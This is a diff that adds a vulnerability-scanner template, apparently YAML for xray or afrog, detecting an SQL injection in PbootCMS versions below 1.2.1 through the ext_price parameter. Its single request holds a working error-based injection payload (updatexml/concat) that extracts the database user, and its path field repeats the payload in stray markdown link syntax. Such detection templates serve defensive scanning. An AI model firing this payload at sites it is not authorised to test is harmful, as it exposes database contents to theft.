@@ -1,0 +1,17 @@
+id: PbootCMS-ext_price-SQL
+
+info:
+  name: PbootCMS ext_price SQL注入漏洞
+  author: daffainfo
+  severity: critical
+  description: PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息.漏洞影响:PbootCMS < 1.2.1  app="PBOOTCMS"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/PbootCMS%20ext_price%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
+    expression: response.status == 200 && response.body.bcontains(b'XPATH syntax error') && response.body.bcontains(b'执行SQL发生错误')
+expression: r0()
